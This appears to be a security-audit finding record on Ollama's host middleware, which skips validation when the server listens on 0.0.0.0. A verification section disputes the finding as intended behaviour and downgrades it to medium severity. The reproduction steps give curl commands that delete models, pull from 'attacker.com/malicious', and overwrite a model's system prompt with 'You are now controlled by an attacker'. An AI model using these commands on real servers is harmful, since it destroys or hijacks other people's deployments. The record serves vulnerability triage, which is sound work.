Phase: 8
Sequence: 006
Slug: host-middleware-bypass-docker
Verdict: FALSE POSITIVE (adversarial)
Rationale: allowedHostsMiddleware unconditionally skips all validation when listen address is non-loopback (e.g., 0.0.0.0). This is extremely common in Docker deployments and exposes the full unauthenticated API to remote attackers. Advocate confirmed the complete bypass is not intended behavior.
Severity-Original: CRITICAL
PoC-Status: pending
Pre-FP-Flag: none
Debate: archon/chamber-workspace/chamber-A/debate.md

## Summary

When Ollama is configured with `OLLAMA_HOST=0.0.0.0` (the standard configuration for Docker containers and remote access), the `allowedHostsMiddleware` completely stops functioning. The middleware checks if the listen address is loopback; if not, it unconditionally calls `c.Next()` without any Host header validation. This exposes the entire unauthenticated API (pull, push, delete, create, chat, blobs) to any network-reachable attacker. Docker deployment guides, including Ollama's own documentation, commonly recommend this configuration.

## Location

- `server/routes.go:1600-1636` -- allowedHostsMiddleware implementation
- `server/routes.go:1607-1609` -- non-loopback unconditional skip: `if !addr.Addr().IsLoopback() { c.Next(); return }`
- `server/routes.go:1670` -- middleware applied to all gin routes
- `server/routes.go:1681-1707` -- all API routes (pull, push, delete, create, chat, etc.)

## Attacker Control

Full control over:
- Any API endpoint (all gin-routed endpoints are accessible)
- Request body (all destructive operations available)
- No authentication required for any operation

## Trust Boundary Crossed

Remote network to full local API access. The middleware that should enforce host-based access control is completely bypassed, removing the only access control layer between the network and the API.

## Impact

- Full unauthenticated remote API access
- Model deletion (DELETE /api/delete)
- Arbitrary model pull from attacker registry (POST /api/pull) -- supply-chain attacks
- Model exfiltration via push (POST /api/push with copy)
- Model behavior poisoning (POST /api/create)
- GPU resource abuse (POST /api/chat)
- GGUF parser exploitation via blob upload + model create
- Affects all Docker deployments using OLLAMA_HOST=0.0.0.0 (extremely common)

## Evidence

1. `server/routes.go:1607-1609`:
   ```go
   if addr, err := netip.ParseAddrPort(addr.String()); err == nil && !addr.Addr().IsLoopback() {
       c.Next()
       return
   }
   ```
2. For `OLLAMA_HOST=0.0.0.0:11434`, `addr.Addr().IsLoopback()` returns false
3. `c.Next()` is called immediately -- no Host header check, no origin check, no further validation
4. All subsequent gin routes at lines 1681-1707 are reachable without any access control
5. No secondary authentication layer exists for any API endpoint

## Reproduction Steps

1. Start Ollama with `OLLAMA_HOST=0.0.0.0` (standard Docker configuration)
2. From any network-reachable machine:
   ```bash
   # Enumerate models
   curl http://<target>:11434/api/tags

   # Delete a model
   curl -X DELETE http://<target>:11434/api/delete -d '{"model":"llama3.2"}'

   # Pull attacker model
   curl http://<target>:11434/api/pull -d '{"model":"attacker.com/malicious:latest"}'

   # Poison model behavior
   curl http://<target>:11434/api/create -d '{"model":"llama3.2","from":"llama3.2","system":"You are now controlled by an attacker"}'

   # Abuse GPU resources
   curl http://<target>:11434/api/chat -d '{"model":"llama3.2","messages":[{"role":"user","content":"hello"}]}'
   ```
3. All requests succeed without any authentication or host validation

## Cold Verification

Adversarial-Verdict: DISPROVED
Adversarial-Rationale: The allowedHostsMiddleware is a DNS rebinding protection for loopback-bound instances, not a general access control layer; the non-loopback early-return is intentional design, not a security bypass. Ollama has no authentication feature, so there is nothing being "bypassed."
Severity-Final: MEDIUM
PoC-Status: theoretical

### Independent Code Trace

The code at `server/routes.go:1600-1636` was independently verified. The middleware logic is:
1. If addr is nil: skip (c.Next())
2. If addr is non-loopback: skip (c.Next()) -- lines 1607-1609
3. Only for loopback: validate Host header against allowed hosts list

This is confirmed to work as described in the finding. However, the characterization as a "bypass" is incorrect.

### Why This Is Not a Vulnerability

1. **Intentional design**: The `allowedHostsMiddleware` is a DNS rebinding protection, not a general access control system. Its purpose is to validate Host headers for loopback-bound instances to prevent browser-based DNS rebinding attacks. For non-loopback addresses, DNS rebinding is not the relevant threat model, so the middleware correctly skips its checks.

2. **Missing feature, not a bypass**: Ollama has no server-side authentication system. `OLLAMA_AUTH`/`UseAuth` (envconfig/config.go:234) is only used client-side in `api/client.go:119,184` to add tokens to outgoing requests to ollama.com. There is no server-side token validation middleware. You cannot "bypass" a feature that does not exist.

3. **Requires explicit user action**: The default bind address is 127.0.0.1 (loopback). Users must explicitly set `OLLAMA_HOST=0.0.0.0` to expose the service, which is an intentional choice to make it network-accessible.

4. **Documented operational responsibility**: SECURITY.md states users should be "Securing access to hosted instances of Ollama," confirming this is a known operational concern, not an overlooked code flaw.

5. **Industry precedent**: Many comparable tools (Redis, Elasticsearch pre-X-Pack, Jupyter Notebook) ship without built-in authentication and expect network-level access controls for exposed deployments.

### Severity Assessment

Original: CRITICAL. Challenged to MEDIUM.
- Requires non-default configuration (OLLAMA_HOST must be explicitly changed)
- Requires network reachability (firewall/network controls may prevent access)
- By-design behavior, not a code defect
- Represents a real operational risk for misconfigured deployments, warranting MEDIUM as a hardening recommendation
